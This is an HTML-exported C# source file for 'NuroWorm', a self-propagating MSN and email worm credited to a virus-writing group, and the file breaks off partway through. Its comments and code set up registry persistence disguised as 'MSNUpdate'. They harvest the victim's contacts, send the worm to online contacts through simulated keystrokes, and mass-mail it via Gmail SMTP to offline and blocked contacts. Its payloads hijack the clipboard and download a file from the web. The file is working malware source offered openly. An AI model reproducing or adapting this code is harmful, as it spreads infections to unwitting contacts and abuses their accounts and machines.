<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=UTF-8">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc13 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*

         MSIL.NuroWorm.msn
      MSN/email spreading worm
    Genetix / DoomRiderz VX team

*/</span><span class="sc0">


</span><span class="sc1">/*
 * My 2nd MSN worm but with email spreading.. it's kinda like the 1 in vb.net but this was more planned and
 * it don't need a file server this used sendkeys instead, also this time in C#.net
 * it searches the current directory for a random files name to use to copy into c:\
 * it create's a rar file in c:\ that it will add itself into.
 * it get's all the contacts and picks a random contact to send itself to, this is fastest way.
 * it creates a random message from alot of set words and sends the message to the contact window.
 * it check the registry for itself and if it isnt there it add's itself to the registry to run on windows startup.
 * befor it does any of this it checks to see if msn is actually loaded and your not offline,
 * does this by checking processes with a timer control.
 * also collects offline/blocked contacts and sends a nice email to them with the worm as attachment and with random email subject
 * it using's gmail's smtp server and send's from a random address (from 2 addresses)
 * deletes copyied files after each run for a clean start next time.
 * has a kewl payload that sets the clipboard to doomriderz website link
 * also has a 2nd payload that spawns a new thread to activate a screen saver and download/play a midi file i like! :p
*/</span><span class="sc0">

</span><span class="sc2">//ps: you must make 2 or more gmail accounts! more is better.
</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">MessengerAPI</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">.</span><span class="sc11">Generic</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Runtime</span><span class="sc10">.</span><span class="sc11">InteropServices</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">ComponentModel</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Windows</span><span class="sc10">.</span><span class="sc11">Forms</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Diagnostics</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Reflection</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">Microsoft</span><span class="sc10">.</span><span class="sc11">Win32</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Net</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Net</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">nuroWorm</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">partial</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Form1</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Form</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">//setup vars used
</span><span class="sc0">
        </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">url</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"http://www.vgmusic.com/music/console/sega/master/Alien3-Title.mid"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">KeyTitle</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"MSNUpdate"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">subkey</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">MyDocuments</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">sFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"nuro.exe"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ForEmail</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">rndName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">smtpserver</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"smtp.gmail.com"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">WebClient</span><span class="sc0"> </span><span class="sc11">wc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">WebClient</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">MessengerAPI</span><span class="sc10">.</span><span class="sc11">Messenger</span><span class="sc0"> </span><span class="sc11">nurofen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">MessengerAPI</span><span class="sc10">.</span><span class="sc11">Messenger</span><span class="sc10">();</span><span class="sc0">

        </span><span class="sc10">[</span><span class="sc11">DllImport</span><span class="sc10">(</span><span class="sc6">"winmm.dll"</span><span class="sc10">)]</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">extern</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">mciSendString</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">strCommand</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">strReturn</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">iReturnLength</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">IntPtr</span><span class="sc0"> </span><span class="sc11">hwndCallback</span><span class="sc10">);</span><span class="sc0">
        
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Form1</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">InitializeComponent</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Form1_Load</span><span class="sc10">(</span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">sender</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">EventArgs</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">MSNtimer</span><span class="sc10">.</span><span class="sc11">Stop</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc11">Thread</span><span class="sc0"> </span><span class="sc11">nuroThread</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Thread</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ThreadStart</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">payload</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc11">nuroThread</span><span class="sc10">.</span><span class="sc11">IsBackground</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">nuroThread</span><span class="sc10">.</span><span class="sc11">Start</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc2">//check if the worm is already in memory
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Is_Active</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Application</span><span class="sc10">.</span><span class="sc11">Exit</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//enable timer if MSN isnt online/running
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">MSNLoaded</span><span class="sc10">())</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">MSNtimer</span><span class="sc10">.</span><span class="sc11">Interval</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1000</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">MSNtimer</span><span class="sc10">.</span><span class="sc11">Start</span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc10">}</span><span class="sc5">else</span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">//everything is ok jump to the worm.
</span><span class="sc0">                    </span><span class="sc11">Worming</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">  
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">


        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">payload</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"wintune.mid"</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">wc</span><span class="sc10">.</span><span class="sc11">DownloadFile</span><span class="sc10">(</span><span class="sc11">url</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"wintune.mid"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">mciSendString</span><span class="sc10">(</span><span class="sc6">"play "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"wintune.mid"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">IntPtr</span><span class="sc10">.</span><span class="sc11">Zero</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">mciSendString</span><span class="sc10">(</span><span class="sc6">"play "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"wintune.mid"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">IntPtr</span><span class="sc10">.</span><span class="sc11">Zero</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Worming</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Msg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">start_with_windows</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc2">//function call to create a rar file
</span><span class="sc0">            </span><span class="sc11">createRAR</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc2">//this is fun!
</span><span class="sc0">            </span><span class="sc11">Clipboard</span><span class="sc10">.</span><span class="sc11">SetData</span><span class="sc10">(</span><span class="sc6">"www.DoomRiderz.co.nr  ---- GirlPower!!!"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">//call function to get a random message
</span><span class="sc0">            </span><span class="sc11">Msg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rndMSNmessage</span><span class="sc10">();</span><span class="sc0"> 
            </span><span class="sc11">nurofen</span><span class="sc10">.</span><span class="sc11">InstantMessage</span><span class="sc10">(</span><span class="sc11">GetContact</span><span class="sc10">());</span><span class="sc0"> </span><span class="sc2">//open chat window for random online contact
</span><span class="sc0">            </span><span class="sc2">//SendKeys.SendWait(Msg); // send the random message
</span><span class="sc0">                </span><span class="sc1">/*
                 * the follwoing are all sendkeys commands.. their very usefull!
                 * because MSN dont support file fransfer programaticly
                 * so by sending key's it will be like a real person send a file
                */</span><span class="sc0">
            </span><span class="sc11">SendKeys</span><span class="sc10">.</span><span class="sc11">SendWait</span><span class="sc10">(</span><span class="sc6">"{ENTER}"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">SendKeys</span><span class="sc10">.</span><span class="sc11">SendWait</span><span class="sc10">(</span><span class="sc6">"{TAB}"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">13</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">SendKeys</span><span class="sc10">.</span><span class="sc11">SendWait</span><span class="sc10">(</span><span class="sc6">"{UP}"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc2">//Send the file using send keys
</span><span class="sc0">            </span><span class="sc11">SendKeys</span><span class="sc10">.</span><span class="sc11">SendWait</span><span class="sc10">(</span><span class="sc6">"{ENTER}"</span><span class="sc10">);</span><span class="sc11">SendKeys</span><span class="sc10">.</span><span class="sc11">SendWait</span><span class="sc10">(</span><span class="sc6">"{DOWN}"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">SendKeys</span><span class="sc10">.</span><span class="sc11">SendWait</span><span class="sc10">(</span><span class="sc6">"{DOWN}"</span><span class="sc10">);</span><span class="sc11">SendKeys</span><span class="sc10">.</span><span class="sc11">SendWait</span><span class="sc10">(</span><span class="sc6">"{ENTER}"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">SendKeys</span><span class="sc10">.</span><span class="sc11">SendWait</span><span class="sc10">(</span><span class="sc6">"c:\\test.rar"</span><span class="sc10">);</span><span class="sc11">SendKeys</span><span class="sc10">.</span><span class="sc11">SendWait</span><span class="sc10">(</span><span class="sc6">"{ENTER}"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">//delete the temp files from c:\
</span><span class="sc0">            </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"test.rar"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rndName</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">//setting up mail spreading
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ForEmail</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">//make address array
</span><span class="sc0">                    </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">addresses</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ForEmail</span><span class="sc10">.</span><span class="sc11">Split</span><span class="sc10">(</span><span class="sc7">'¬'</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc2">//Get each addresse from the array 1 by 1
</span><span class="sc0">                    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">addresses</span><span class="sc10">.</span><span class="sc11">GetUpperBound</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc2">//check if there is actually anything there
</span><span class="sc0">                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">addresses</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc2">//send contact to mailing function
</span><span class="sc0">                        </span><span class="sc11">MSN_MailWorm</span><span class="sc10">(</span><span class="sc11">addresses</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0"> 
                    </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">


        </span><span class="sc2">//function to grab a random contact
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">GetContact</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">rnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">conCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Conts</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">//create new messanger class
</span><span class="sc0">            </span><span class="sc11">MessengerClass</span><span class="sc0"> </span><span class="sc11">mess</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">MessengerClass</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc2">//set contact variable as messanger contacts
</span><span class="sc0">            </span><span class="sc11">IMessengerContacts</span><span class="sc0"> </span><span class="sc11">Contacts</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc2">//get messanger contacts from signed in account
</span><span class="sc0">            </span><span class="sc11">Contacts</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMessengerContacts</span><span class="sc10">)</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">MyContacts</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc2">//create array of contacts
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">hosts</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">[</span><span class="sc11">Contacts</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc10">];</span><span class="sc0">

            </span><span class="sc2">//guess
</span><span class="sc0">            </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMessengerContact</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">Contacts</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//No offliners plz!
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">.</span><span class="sc11">Status</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">MISTATUS</span><span class="sc10">.</span><span class="sc11">MISTATUS_OFFLINE</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">host</span><span class="sc10">.</span><span class="sc11">Blocked</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">Conts</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Conts</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"¬"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">.</span><span class="sc11">SigninName</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//online contacts
</span><span class="sc0">                    </span><span class="sc11">conCount</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">ForEmail</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ForEmail</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"¬"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">.</span><span class="sc11">SigninName</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//get the blocked/offline contacts (they aint getting away!)
</span><span class="sc0">                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">contct</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Conts</span><span class="sc10">.</span><span class="sc11">Split</span><span class="sc10">(</span><span class="sc7">'¬'</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//split into array
</span><span class="sc0">            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">contct</span><span class="sc10">[</span><span class="sc11">rnd</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">conCount</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)].</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc2">//return random contact
</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//generate a random message
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">rndMSNmessage</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">rnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">intro</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">scnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">thrd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">fth</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">why</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">[</span><span class="sc4">15</span><span class="sc10">];</span><span class="sc0">

            </span><span class="sc11">intro</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"hey"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">intro</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"hay"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">intro</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"hi"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">intro</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"hello"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">intro</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"hiya"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">scnd</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"download"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">scnd</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"get"</span><span class="sc10">;</span><span class="sc0">
